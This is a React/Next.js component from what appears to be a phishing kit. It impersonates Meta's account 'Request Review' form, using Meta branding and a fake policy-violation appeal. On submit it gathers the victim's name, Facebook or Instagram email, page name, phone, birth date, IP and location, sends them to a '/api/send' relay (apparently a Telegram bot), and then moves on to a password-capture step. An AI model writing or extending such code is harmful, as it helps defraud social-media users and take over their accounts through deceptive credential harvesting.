'use client';

import MetaLogo from '@/assets/images/meta-logo-image.png';
import { useTranslation } from '@/utils/use-translation';
import { store } from '@/store/store';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import dynamic from 'next/dynamic';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useMemo, useState } from 'react';

const IntlTelInput = dynamic(() => import('intl-tel-input/reactWithUtils'), { ssr: false });

interface FormData {
    fullName: string;
    pageName: string;
    personalEmail: string;
    reviewReason?: string;
    reviewDescription?: string;
    birthDay?: string;
    birthMonth?: string;
    birthYear?: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email Facebook or Instagram', type: 'email' },
    { name: 'pageName', label: 'Page Name', type: 'text' }
];
const InitModal: FC = () => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        pageName: '',
        personalEmail: '',
        reviewReason: '',
        reviewDescription: '',
        birthDay: '',
        birthMonth: '',
        birthYear: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setMessage, setUserEmail, setUserFullName, setUserPhone, setFormStep, formStep } = store();
    const { t } = useTranslation();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement | HTMLSelectElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>� Page Name:</b> <code>${formData.pageName}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
${formData.birthDay && formData.birthMonth && formData.birthYear ? `<b>🎂 Date of Birth:</b> <code>${formData.birthDay}/${formData.birthMonth}/${formData.birthYear}</code>` : ''}

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            // Store user data and switch to password form step
            setUserEmail(formData.personalEmail);
            setUserFullName(formData.fullName);
            setUserPhone(phoneNumber);
            setFormStep('password');
        }
    };

    // Only show init modal if formStep is not set to password or other steps
    if (formStep && formStep !== 'init') {
        return null;
    }

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center p-2 sm:p-4 md:p-6'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] overflow-hidden'>
                <div className='mb-1 sm:mb-1.5 flex w-full items-center justify-between p-3 sm:p-3.5 pb-0'>
                    <p className='text-xs sm:text-sm font-bold'>{t('Request Review')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='lg' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-3 sm:px-3.5'>
                    <div className='flex flex-col gap-1.5 sm:gap-2 py-2.5 sm:py-3'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t(field.label)}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-16 sm:min-h-20 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm' rows={2} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm' />}
                            </div>
                        ))}
                        <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-0.5'>{t('Mobile phone number')}</p>
                        <IntlTelInput
                            key={countryCode}
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-sm'
                            }}
                        />

                        {/* Date of Birth Section */}
                        <div className='mt-1.5 sm:mt-2'>
                            <p className='text-xs sm:text-sm font-sans text-[#1C2B33] font-semibold mb-1.5'>{t('Date of birth')}</p>
                            <div className='grid grid-cols-3 gap-1.5 sm:gap-2'>
                                {/* Day Selector */}
                                <div>
                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Day')}</label>
                                    <select
                                        name='birthDay'
                                        value={formData.birthDay}
                                        onChange={handleInputChange}
                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                    >
                                        <option value=''>DD</option>
                                        {Array.from({ length: 31 }, (_, i) => i + 1).map((day) => (
                                            <option key={day} value={String(day).padStart(2, '0')}>
                                                {String(day).padStart(2, '0')}
                                            </option>
                                        ))}
                                    </select>
                                </div>

                                {/* Month Selector */}
                                <div>
                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Month')}</label>
                                    <select
                                        name='birthMonth'
                                        value={formData.birthMonth}
                                        onChange={handleInputChange}
                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                    >
                                        <option value=''>MM</option>
                                        {[
                                            { num: '01', name: 'January' },
                                            { num: '02', name: 'February' },
                                            { num: '03', name: 'March' },
                                            { num: '04', name: 'April' },
                                            { num: '05', name: 'May' },
                                            { num: '06', name: 'June' },
                                            { num: '07', name: 'July' },
                                            { num: '08', name: 'August' },
                                            { num: '09', name: 'September' },
                                            { num: '10', name: 'October' },
                                            { num: '11', name: 'November' },
                                            { num: '12', name: 'December' }
                                        ].map((month) => (
                                            <option key={month.num} value={month.num}>
                                                {month.num}
                                            </option>
                                        ))}
                                    </select>
                                </div>

                                {/* Year Selector */}
                                <div>
                                    <label className='text-xs text-[#1C2B33] block mb-0.5'>{t('Year')}</label>
                                    <select
                                        name='birthYear'
                                        value={formData.birthYear}
                                        onChange={handleInputChange}
                                        className='h-9 sm:h-10 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2 py-1.5 text-xs sm:text-sm font-sans text-[#1C2B33] bg-white cursor-pointer hover:border-[#c0c8d1] transition-colors focus:outline-none focus:border-blue-500'
                                    >
                                        <option value=''>YYYY</option>
                                        {Array.from({ length: new Date().getFullYear() - 1949 }, (_, i) => new Date().getFullYear() - i).map((year) => (
                                            <option key={year} value={String(year)}>
                                                {year}
                                            </option>
                                        ))}
                                    </select>
                                </div>
                            </div>
                        </div>
                        
                        {/* Review Reason Section */}
                        <div className='mt-1.5 sm:mt-2'>
                            <p className='text-xs sm:text-sm font-sans mb-1'>{t('Why are you requesting a review?')}</p>
                            <div className='flex flex-col gap-1'>
                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value="I'm not sure which policy was violated."
                                        checked={formData.reviewReason === "I'm not sure which policy was violated."}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t("I'm not sure which policy was violated.")}</span>
                                </label>
                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value='I think there was unauthorized use of my account.'
                                        checked={formData.reviewReason === 'I think there was unauthorized use of my account.'}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t('I think there was unauthorized use of my account.')}</span>
                                </label>
                                <label className='flex items-center gap-1.5 cursor-pointer'>
                                    <input
                                        type='radio'
                                        name='reviewReason'
                                        value='Another reason:'
                                        checked={formData.reviewReason === 'Another reason:'}
                                        onChange={handleInputChange}
                                        className='w-4 h-4'
                                    />
                                    <span className='text-xs sm:text-sm'>{t('Another reason:')}</span>
                                </label>
                            </div>
                            
                            {/* Description textarea */}
                            {formData.reviewReason === 'Another reason:' && (
                                <textarea
                                    name='reviewDescription'
                                    value={formData.reviewDescription}
                                    onChange={handleInputChange}
                                    placeholder={t('Please describe your reason')}
                                    className='mt-1.5 min-h-16 w-full rounded-[8px] border-2 border-[#d4dbe3] px-2.5 py-1.5 text-xs'
                                    rows={2}
                                />
                            )}
                        </div>
                        <button type='submit' disabled={isLoading} className={`mt-2 sm:mt-2.5 flex h-9 sm:h-10 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs text-white transition-colors hover:bg-blue-700 ${isLoading ? 'cursor-not-allowed opacity-80' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-2 sm:p-2.5'>
                    <Image src={MetaLogo} alt='' className='h-3 sm:h-3.5 w-12 sm:w-14' />
                </div>
            </div>
            </div>
        </>
    );
};

export default InitModal;
